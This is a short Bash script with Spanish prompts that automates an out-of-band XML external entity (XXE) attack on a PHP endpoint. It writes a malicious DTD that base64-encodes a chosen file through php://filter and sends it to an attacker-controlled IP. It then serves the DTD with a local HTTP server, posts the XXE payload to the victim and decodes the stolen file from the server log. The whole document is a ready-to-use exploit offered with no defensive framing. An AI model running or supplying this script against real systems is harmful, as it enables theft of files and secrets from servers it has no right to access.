#!/bin/bash

echo -en "\n Digite el archivo que desea ver: " & read -r archivo
echo -en "\n Digite la ip destino: " & read -r ip
echo -en "\n Digite la ruta del archivo vulnerable (localhost:5000/process.php): " & read -r victima
contenido_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$archivo\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://$ip/?file=%file;'>\">
%eval;
%exfil;
"""

echo $contenido_dtd > malicious.dtd

python3 -m http.server 80 &> data &

PID=$!
sleep 1; echo

curl -s -X POST "http://$victima" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.0.19/malicious.dtd"> %xxe;]><root><name>test</name><tel>413527463</tel><email>&myFile;</email><password>m0xx12345</password></root>' &>/dev/null

cat data | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID

wait $PID 2>/dev/null
